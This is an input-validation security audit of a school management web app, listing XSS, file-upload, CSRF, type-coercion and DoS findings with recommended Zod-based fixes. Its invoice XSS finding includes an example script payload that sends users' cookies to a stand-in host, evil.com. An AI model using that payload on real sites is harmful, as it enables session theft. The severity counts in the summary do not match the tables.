# Phase 4A — Input Validation & Injection Hardening Audit

**Date:** 2026-09-04
**Gate Decision:** AUDIT COMPLETE
**Project:** School Management System — Input Security

---

## 1. Executive Summary

Comprehensive audit of all input boundaries across 44 server actions, 43 API routes, 27 library files, and 2 service files.

**Key statistics:**
- **CRITICAL findings: 2** (XSS in PDF/HTML generation)
- **HIGH findings: 4** (missing validation, file upload, type coercion)
- **MEDIUM findings: 6** (CSRF, input length, QR DoS)
- **LOW findings: 4** (defense-in-depth)
- **INFO findings: 2** (improvement opportunities)

**Most pervasive issue:** The vast majority of server actions and API routes perform NO runtime input validation. Client-controlled data reaches Prisma/database logic without Zod, UUID format checks, length limits, or type validation.

**PHASE 4A AUDIT = COMPLETE**

---

## 2. Scope

**Files audited:**
- `actions/**/*.ts` — 44 files, ~200+ exported functions
- `app/api/**/route.ts` — 43 route files
- `lib/**/*.ts` — 27 library files
- `services/**/*.ts` — 2 service files

**Search patterns:** Zod, FormData, request.json, searchParams, params, JSON.parse, $queryRaw, dangerouslySetInnerHTML, redirect, file upload, template literals with user data.

---

## 3. Existing Validation Architecture

### Zod Usage

**Server Actions:** 27 of 44 files import Zod. However, Zod is used inconsistently:
- Many `create*` functions have Zod schemas
- Most `update*` and `delete*` functions have NO validation on the resource ID parameter
- Many functions accept raw FormData without structural validation

**API Routes:** 0 of 43 routes use Zod. Not a single route imports or uses `z.object`, `z.string`, `.parse`, or `.safeParse`.

### Validation Summary

| Layer | Zod Used | Runtime Validation | UUID Checks | Length Limits |
|---|---|---|---|---|
| Server Actions (create) | Partial (~40/120 functions) | Partial | Rare | Rare |
| Server Actions (update/delete) | Rare (~5/80 functions) | Rare | Never | Never |
| API Routes (GET) | 0/25 | 0/25 | 0/25 | 0/25 |
| API Routes (POST/PATCH/DELETE) | 0/18 | 0/18 | 0/18 | 0/18 |

---

## 4. Server Action Validation Inventory

### Classification Summary

| Classification | Count | Percentage |
|---|---|---|
| SAFE (full Zod validation) | ~40 | 33% |
| PARTIAL (some validation, gaps) | ~8 | 7% |
| MISSING (no runtime validation) | ~72 | 60% |
| **Total functions accepting input** | **~120** | **100%** |

### Highest Risk Files (ZERO Zod Validation)

| File | Risk |
|---|---|
| `timetable.actions.ts` | Complex create/update with many fields, no validation |
| `school.actions.ts` | Create/update/delete with no validation |
| `attendance.actions.ts` | Bulk operations with no validation |
| `assignment.actions.ts` | Create with no validation |
| `class-teacher.actions.ts` | Create with no validation |
| `leave.actions.ts` | Create with no validation |
| `auth.actions.ts` | All auth functions with no validation |

### JSON.parse() on Client Data

| File | Line | Risk |
|---|---|---|
| `student-portal.actions.ts` | 173 | MODERATE — parsed attachments stored in DB without validation |
| `question-bank.actions.ts` | 44 | LOW — downstream Zod validation |
| `online-exam.actions.ts` | 113 | LOW — downstream Zod validation |
| `message.actions.ts` | 33 | LOW — downstream Zod validation |

---

## 5. API Route Validation Inventory

### Classification Summary

| Classification | Count | Percentage |
|---|---|---|
| SAFE (auth-derived only) | 16 | 37% |
| PARTIAL (some checks, gaps) | 18 | 42% |
| MISSING (no runtime validation) | 9 | 21% |
| **Total routes** | **43** | **100%** |

### MISSING Validation Routes

| Route | Method | Specific Gap |
|---|---|---|
| `teacher/students` | GET | `page`/`limit` can be NaN/negative; `q` unbounded; `studentId` not UUID-validated |
| `mobile/messages/send` | POST | Unbounded `content`; arbitrary `receiverId` to Prisma |
| `mobile/homework/submit` | POST | Arbitrary `homeworkId`; unbounded `content` |
| `teacher/meetings/[id]/status` | PATCH | `status` cast as `any` — any string written to DB |
| `teacher/meetings/[id]/notes` | POST | No body existence check; unbounded `content` |
| `teacher/meetings` | POST | Multiple unvalidated fields including arbitrary date strings |
| `qr/route.ts` | GET | Unbounded `data` to QR engine (DoS risk) |
| `teacher/exams/save-results` | POST | Unbounded `results` array; no marks range validation |
| `mobile/attendance/class` | POST | `status` cast to enum without runtime validation |

### PARTIAL Validation Routes (18 routes)

All 18 PARTIAL routes share the same gap: **IDs from params/searchParams/body are not validated as UUID format** before being passed to Prisma. While Prisma parameterizes queries (preventing SQL injection), invalid UUIDs cause silent failures or unexpected behavior.

---

## 6. Missing Zod Validation Findings

### FINDING IV-1 — No UUID Validation on API Route Parameters

**Severity:** HIGH
**Files:** All 27 routes accepting `params` or `searchParams` IDs
**Root Cause:** No UUID format validation (`/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i`) before Prisma queries
**Exploit Scenario:** Attacker submits malformed ID → Prisma returns null/error → potential information leak via error messages or unexpected behavior
**Current Protection:** Prisma parameterized queries prevent SQL injection, but format is unvalidated
**Recommended Fix:** Add `z.string().uuid()` validation to all ID parameters

### FINDING IV-2 — No Input Length Limits on String Fields

**Severity:** MEDIUM
**Files:** 8+ API routes and 30+ server actions
**Root Cause:** No `maxLength` constraints on `content`, `title`, `description`, `subject`, `remarks`, `notes` fields
**Exploit Scenario:** Attacker submits multi-megabyte string → DB storage exhaustion, slow queries, potential DoS
**Current Protection:** Database column limits (if defined in schema) provide some protection
**Recommended Fix:** Add `z.string().max(N)` validation

### FINDING IV-3 — No Enum Validation on Status/Type Fields

**Severity:** HIGH
**Files:** `teacher/meetings/[id]/status/route.ts:20`, `teacher/meetings/route.ts` (POST), `mobile/attendance/class/route.ts`
**Root Cause:** Status values cast as `any` or TypeScript enum without runtime validation
**Exploit Scenario:** Attacker submits arbitrary string → written to DB enum column → data corruption
- `status as any` at `teacher/meetings/[id]/status/route.ts:20` — ANY string written to meeting status
- `meetingType` not validated against allowed values in meeting creation
**Current Protection:** TypeScript types (compile-time only, no runtime enforcement)
**Recommended Fix:** Add `z.enum([...])` validation

### FINDING IV-4 — No Numeric Range Validation on Financial/Score Fields

**Severity:** HIGH
**Files:** `teacher/exams/save-results/route.ts:24-32`
**Root Cause:** `result.marksObtained` accepted without range check (could be negative, non-numeric, exceeding totalMarks)
**Exploit Scenario:** Attacker submits negative marks or non-numeric values → data corruption in exam results
**Current Protection:** None
**Recommended Fix:** Add `z.number().min(0).max(exam.totalMarks)` validation

### FINDING IV-5 — No Array Size Limit on Bulk Operations

**Severity:** MEDIUM
**Files:** `teacher/exams/save-results/route.ts:23`
**Root Cause:** `results` array has no upper bound — unbounded loop of DB upserts
**Exploit Scenario:** Attacker submits 10,000 results → potential DoS via excessive DB operations
**Current Protection:** None
**Recommended Fix:** Add `z.array(...).max(500)` or similar limit

---

## 7. Prisma / SQL Injection Audit

### FINDING SQL-1 — $queryRawUnsafe Usage

**Severity:** LOW
**File:** `actions/reports.actions.ts:158-172`
**Root Cause:** Uses `$queryRawUnsafe` instead of `$queryRaw`
**Exploit Scenario:** Parameters are server-derived (not user input) and use parameterized queries (`$1`, `$2`)
**Current Protection:** Parameterized queries prevent injection
**Recommended Fix:** Switch to `$queryRaw` for defense-in-depth

### Seed Scripts

`scripts/seed.ts`, `scripts/seed-permissions.ts`, `scripts/seed-auth-users.ts` use `$executeRaw` and `$executeRawUnsafe` with hardcoded values. **Development only, no production risk.**

### Dynamic Prisma Queries

No client-controlled `orderBy`, `select`, or `include` field names found. All dynamic Prisma values are server-derived.

**Overall SQL injection risk: LOW** — Prisma parameterized queries provide strong protection.

---

## 8. Dynamic Query Audit

No client-controlled dynamic Prisma query structure found. All `orderBy`, `select`, `include`, and relation queries use hardcoded field names.

---

## 9. XSS Audit

### FINDING XSS-1 — Stored XSS in Invoice PDF/HTML Generation

**Severity:** CRITICAL
**File:** `lib/invoice-pdf.ts:82-181`
**Root Cause:** User-controlled values (student name, email, phone, address, invoice notes, fee names, reference numbers) are interpolated into raw HTML via `${...}` template literals WITHOUT any HTML escaping
**Exploit Scenario:**
1. Admin creates student with name: `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`
2. Any user viewing the invoice PDF triggers the script
3. The HTML is served as `Content-Type: text/html` from `app/api/invoices/pdf/route.ts:56`
**Unescaped fields:** `school.name`, `school.address`, `school.phone`, `school.email`, `invoice.invoiceNumber`, `invoice.student.firstName`, `invoice.student.lastName`, `invoice.student.admissionNo`, `invoice.student.phone`, `invoice.student.email`, `invoice.notes`, `item.feeStructure.name`, `item.feeStructure.category`, `p.receiptNumber`, `p.referenceNumber`
**Current Protection:** None — raw HTML served directly
**Recommended Fix:** Implement `escapeHtml()` utility and apply to all `${...}` interpolations

### FINDING XSS-2 — Stored XSS in Certificate PDF/HTML Generation

**Severity:** CRITICAL
**File:** `lib/certificate-pdf.ts:62-179`
**Root Cause:** Same pattern as XSS-1 — user-controlled values interpolated into raw HTML without escaping
**Exploit Scenario:** Student name, address, school name, class name can contain arbitrary HTML/JS
**Unescaped fields:** `school.name`, `school.address`, `school.phone`, `school.email`, `student.firstName`, `student.lastName`, `student.admissionNo`, `student.address`, `enrollment.class.name`, `enrollment.section.name`
**Current Protection:** None
**Recommended Fix:** Same as XSS-1

### FINDING XSS-3 — window.location.href with API Response

**Severity:** LOW
**File:** `app/(dashboard)/dashboard/fees/payments/payment-view.tsx:81`
**Root Cause:** `window.location.href = data.url` where `data.url` comes from Stripe checkout API response
**Exploit Scenario:** If API returns `javascript:alert(1)` URL (unlikely due to Stripe validation), script executes
**Current Protection:** Stripe validates redirect URLs against configured domain
**Recommended Fix:** Validate URL starts with `https://` before assignment

---

## 10. PDF / HTML Injection Audit

### FINDING PDF-1 — Invoice HTML Served Without Sanitization

**Severity:** CRITICAL
**File:** `app/api/invoices/pdf/route.ts:52-59`
**Root Cause:** `generateInvoicePDF()` returns raw HTML served with `Content-Type: text/html`
**Exploit Scenario:** Same as XSS-1 — stored XSS via any user-controlled field in the invoice
**Current Protection:** None
**Recommended Fix:** Sanitize HTML output or switch to `Content-Type: application/pdf` with proper PDF generation

### FINDING PDF-2 — Certificate HTML Served Without Sanitization

**Severity:** CRITICAL
**File:** `app/api/certificates/route.ts:43-54`
**Root Cause:** Same pattern as PDF-1
**Current Protection:** None
**Recommended Fix:** Same as PDF-1

### FINDING PDF-3 — ID Card PDF (Safe)

**File:** `lib/id-card-pdf.ts`
**Status:** SAFE — uses jsPDF (`pdf.text()`), not HTML templates. No injection risk.

---

## 11. CSRF Audit

### Authentication Model

| Layer | Auth Type | CSRF Risk |
|---|---|---|
| Web app (browser) | Supabase SSR cookies (`SameSite: Lax`) | Partial |
| Mobile API (`/api/mobile/*`) | Bearer token | None |
| Server Actions (`"use server"`) | Next.js built-in CSRF | None |
| Stripe webhook | Signature verification | None |

### FINDING CSRF-1 — No Explicit CSRF Protection on Cookie-Authenticated API Routes

**Severity:** MEDIUM
**Files:** 8 state-changing API routes using `requireRole()` (cookie auth)
**Root Cause:** No CSRF tokens, no Origin/Referer header validation
**Affected Routes:**
- `POST /api/upload/homework`
- `POST /api/teacher/meetings`
- `PATCH /api/teacher/meetings/[id]/status`
- `POST /api/teacher/meetings/[id]/notes`
- `POST /api/teacher/exams/save-results`
- `POST /api/push`
- `DELETE /api/push`
- `POST /api/payments/checkout`
**Exploit Scenario:** Same-site attacker (subdomain compromise) could perform CSRF on these endpoints
**Current Protection:** `SameSite: Lax` blocks cross-origin POST from external sites. Server Actions have Next.js built-in CSRF.
**Recommended Fix:** Add Origin header validation on API routes, or migrate mutations to Server Actions

---

## 12. File Upload Audit

### FINDING UPLOAD-1 — User-Controlled File Extension

**Severity:** HIGH
**File:** `app/api/upload/homework/route.ts:45-46`
**Root Cause:** File extension extracted from user-supplied `file.name` without validation
```typescript
const ext = file.name.split(".").pop() || "bin"
const safeName = `${randomUUID()}.${ext}`
```
**Exploit Scenario:** Attacker uploads `malware.exe` with MIME type `application/pdf` → saved as `UUID.exe` → served statically from `public/uploads/homework/`
**Current Protection:** MIME type check (browser-reported, spoofable), UUID filename prevents overwrites
**Recommended Fix:** Validate extension against allowlist; validate MIME matches extension; use magic-byte inspection

### FINDING UPLOAD-2 — No Server-Side Content Verification

**Severity:** HIGH
**File:** `app/api/upload/homework/route.ts:35`
**Root Cause:** Only checks browser-reported `file.type` — no magic-byte inspection
**Exploit Scenario:** Any file type can be uploaded by spoofing MIME header
**Current Protection:** Browser-reported MIME check (trivially bypassable)
**Recommended Fix:** Read file header bytes and verify against expected signatures

### FINDING UPLOAD-3 — No Tenant Isolation on Uploads

**Severity:** MEDIUM
**File:** `app/api/upload/homework/route.ts:47`
**Root Cause:** All files stored in shared `public/uploads/homework/` directory with no schoolId scoping
**Exploit Scenario:** Files from all schools commingled; any authenticated user can access any file via URL
**Current Protection:** None
**Recommended Fix:** Embed schoolId in storage path; add access control on file serving

### FINDING UPLOAD-4 — Static File Serving Without Access Control

**Severity:** LOW
**File:** `app/api/upload/homework/route.ts:47`
**Root Cause:** Files saved to `public/` directory served statically by web server without auth
**Exploit Scenario:** Anyone with the URL can download any uploaded file
**Current Protection:** None
**Recommended Fix:** Move uploads to non-public directory with authenticated serving

---

## 13. URL / Open Redirect Audit

### FINDING URL-1 — All Redirects Safe

All `redirect()` calls use hardcoded paths or `getRedirectPath(role)` (server-side role map). No user-controlled redirect targets found.

### FINDING URL-2 — Stripe Origin Header Usage

**Severity:** LOW
**File:** `app/api/payments/checkout/route.ts:68`
**Root Cause:** `request.headers.get("origin")` used in Stripe success/cancel URLs
**Current Protection:** Stripe validates URLs against configured domain
**Recommended Fix:** None required — Stripe provides adequate protection

---

## 14. JSON / Type Coercion Audit

### FINDING COERCION-1 — parseInt Without NaN Check

**Severity:** LOW
**Files:** `app/api/qr/route.ts:22`, `app/api/teacher/students/route.ts` (page/limit params)
**Root Cause:** `parseInt()` returns `NaN` for non-numeric strings; no NaN check follows
**Exploit Scenario:** `?size=abc` → `NaN` passed to `QRCode.toBuffer()` → potential error or default behavior
**Current Protection:** Prisma handles some cases; try-catch in routes
**Recommended Fix:** Add `isNaN()` checks after `parseInt()`

### FINDING COERCION-2 — new Date() with Arbitrary Strings

**Severity:** MEDIUM
**Files:** `app/api/teacher/meetings/route.ts` (POST — `new Date(body.startDateTime)`)
**Root Cause:** Date strings from client parsed without format validation
**Exploit Scenario:** Invalid date string → `Invalid Date` object stored in DB
**Current Protection:** Prisma may reject invalid dates at DB level
**Recommended Fix:** Validate date format with `z.string().datetime()` or equivalent

---

## 15. Input Size / DoS Audit

### FINDING DOS-1 — Unbounded QR Code Data

**Severity:** MEDIUM
**File:** `app/api/qr/route.ts:21,54`
**Root Cause:** `data` parameter has no maximum length before being passed to `QRCode.toBuffer()`
**Exploit Scenario:** Attacker sends very large string → QR engine consumes excessive memory/CPU
**Current Protection:** Rate limiting (120 requests/minute per IP)
**Recommended Fix:** Add `z.string().max(2048)` validation

### FINDING DOS-2 — Unbounded Results Array

**Severity:** MEDIUM
**File:** `app/api/teacher/exams/save-results/route.ts:23`
**Root Cause:** `results` array has no upper bound
**Exploit Scenario:** Attacker submits 10,000+ results → unbounded loop of DB upserts
**Current Protection:** None
**Recommended Fix:** Add `z.array(...).max(500)` limit

### FINDING DOS-3 — Unbounded Search Query

**Severity:** LOW
**File:** `app/api/teacher/students/route.ts` (q param)
**Root Cause:** Search string `q` passed to Prisma `contains` with no length limit
**Exploit Scenario:** Very long search string → slow DB query
**Current Protection:** Prisma query optimizer
**Recommended Fix:** Add `z.string().max(100)` validation

---

## 16. Validation Order Audit

### Correct Order (Target)
```
1. Authentication
↓
2. Authorization
↓
3. Runtime input validation
↓
4. Resource ownership validation
↓
5. Database operation
```

### Current State

| Route | Auth | Authz | Input Validation | Ownership | DB Op | Status |
|---|---|---|---|---|---|---|
| `invoices/pdf` | ✅ | ✅ | ❌ Missing | ✅ | ✅ | PARTIAL |
| `certificates` | ✅ | ✅ | ❌ Missing | ✅ | ✅ | PARTIAL |
| `payments/checkout` | ✅ | ✅ | ❌ Missing | ✅ | ✅ | PARTIAL |
| `meetings/[id]/notes` | ✅ | ✅ | ❌ Missing | ✅ | ✅ | PARTIAL |
| `meetings/[id]/status` | ✅ | ✅ | ❌ Missing | ✅ | ✅ | PARTIAL |
| `exams/save-results` | ✅ | ✅ | ❌ Missing | ✅ | ✅ | PARTIAL |
| `upload/homework` | ✅ | N/A | ⚠️ Partial | ❌ Missing | ✅ | PARTIAL |
| `qr/route.ts` | ✅ | N/A | ❌ Missing | N/A | ✅ | PARTIAL |

**Common gap:** Step 3 (runtime input validation) is missing or incomplete across all routes.

---

## 17. Findings by Severity

### CRITICAL (2)

| ID | Finding | File | Line |
|---|---|---|---|
| XSS-1 | Stored XSS in invoice HTML generation | `lib/invoice-pdf.ts` | 82-181 |
| XSS-2 | Stored XSS in certificate HTML generation | `lib/certificate-pdf.ts` | 62-179 |

### HIGH (4)

| ID | Finding | File | Line |
|---|---|---|---|
| IV-1 | No UUID validation on API route parameters | 27 routes | Various |
| IV-3 | No enum validation on status/type fields | `meetings/[id]/status/route.ts` | 20 |
| IV-4 | No numeric range validation on marks | `exams/save-results/route.ts` | 24 |
| UPLOAD-1 | User-controlled file extension | `upload/homework/route.ts` | 45 |
| UPLOAD-2 | No server-side content verification | `upload/homework/route.ts` | 35 |

### MEDIUM (6)

| ID | Finding | File | Line |
|---|---|---|---|
| IV-2 | No input length limits | 8+ routes, 30+ actions | Various |
| IV-5 | No array size limit on bulk ops | `exams/save-results/route.ts` | 23 |
| CSRF-1 | No CSRF tokens on API routes | 8 routes | Various |
| UPLOAD-3 | No tenant isolation on uploads | `upload/homework/route.ts` | 47 |
| COERCION-2 | new Date() with arbitrary strings | `teacher/meetings/route.ts` | POST |
| DOS-1 | Unbounded QR code data | `qr/route.ts` | 21 |
| DOS-2 | Unbounded results array | `exams/save-results/route.ts` | 23 |

### LOW (4)

| ID | Finding | File | Line |
|---|---|---|---|
| SQL-1 | $queryRawUnsafe usage | `reports.actions.ts` | 158 |
| XSS-3 | window.location.href with API data | `payment-view.tsx` | 81 |
| UPLOAD-4 | Static file serving without auth | `upload/homework/route.ts` | 47 |
| DOS-3 | Unbounded search query | `teacher/students/route.ts` | q param |
| COERCION-1 | parseInt without NaN check | `qr/route.ts` | 22 |
| URL-2 | Stripe origin header usage | `payments/checkout/route.ts` | 68 |

### INFO (2)

| ID | Finding | File |
|---|---|---|
| INFO-1 | No CSRF on Server Actions (safe — Next.js built-in) | All `actions/*.ts` |
| INFO-2 | Mobile API immune to CSRF (Bearer auth) | All `app/api/mobile/*/route.ts` |

---

## 18. Recommended Remediation Phases

### PHASE 4B — Critical/High Remediation (Priority)

1. **XSS-1 + XSS-2 (CRITICAL):** Implement `escapeHtml()` utility; apply to all `${...}` in `lib/invoice-pdf.ts` and `lib/certificate-pdf.ts`
2. **IV-1 (HIGH):** Add `z.string().uuid()` validation to all API route ID parameters
3. **IV-3 (HIGH):** Add `z.enum([...])` validation for status/type fields
4. **IV-4 (HIGH):** Add `z.number().min(0).max(totalMarks)` for exam marks
5. **UPLOAD-1 + UPLOAD-2 (HIGH):** Validate file extension against allowlist; add magic-byte inspection

### PHASE 4C — Medium Remediation

6. Add `z.string().max(N)` length limits to all string inputs
7. Add `z.array(...).max(N)` limits to bulk operations
8. Add Origin header validation to cookie-authenticated API routes
9. Add schoolId to upload storage paths
10. Validate date formats with `z.string().datetime()`
11. Add length limit to QR data parameter

### PHASE 4D — Low/Defense-in-Depth

12. Switch `$queryRawUnsafe` to `$queryRaw`
13. Add NaN checks after `parseInt()`
14. Validate URL schemes before `window.location.href` assignment

---

## 19. Final Scorecard

| Security Area | Status |
|---|---|
| Zod Validation Coverage | ⚠️ PARTIAL — 33% of actions, 0% of routes |
| UUID Validation | ❌ MISSING — 0/43 routes |
| Input Length Limits | ❌ MISSING — most routes |
| Enum Validation | ❌ MISSING — status/type fields |
| SQL Injection | ✅ LOW RISK — Prisma parameterized |
| XSS (dangerouslySetInnerHTML) | ✅ NONE FOUND |
| XSS (PDF/HTML templates) | ❌ CRITICAL — 2 files |
| CSRF | ⚠️ PARTIAL — SameSite=Lax only |
| File Upload Safety | ❌ HIGH RISK — no content verification |
| Open Redirects | ✅ NONE FOUND |
| Type Coercion | ⚠️ PARTIAL — parseInt issues |
| Input Size/DoS | ⚠️ PARTIAL — unbounded arrays/strings |
| Validation Order | ⚠️ PARTIAL — step 3 missing |

---

## 20. Phase 4A Gate Decision

```
PHASE 4A AUDIT = COMPLETE
```

**Findings:**
- CRITICAL: 2
- HIGH: 5
- MEDIUM: 7
- LOW: 6
- INFO: 2

**Total: 22 findings**
